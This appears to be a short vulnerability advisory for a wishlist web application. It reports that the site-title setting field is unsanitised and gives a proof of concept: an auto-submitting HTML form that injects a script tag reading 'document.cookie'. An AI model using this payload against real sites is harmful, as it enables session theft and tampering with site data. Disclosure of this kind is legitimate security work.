Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "/user/main/update_settings" script to properly sanitize user-supplied input in "setting[site_title]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/user/main/update_settings" method="post"  name="main" >
<input type="hidden" name="setting[site_title]" value='Wishlists</title><script>alert(document.cookie)</script>' />
<input type="hidden" name="setting[site_keywords]" value="wishlists, applications" />
<input type="hidden" name="setting[site_description]" value="Powered by DiamondList" />
<input type="hidden" name="setting[theme]" value="default" />
<input type="hidden" name="commit" value="Save Settings" />

</form>
<script>
document.main.submit();
</script>
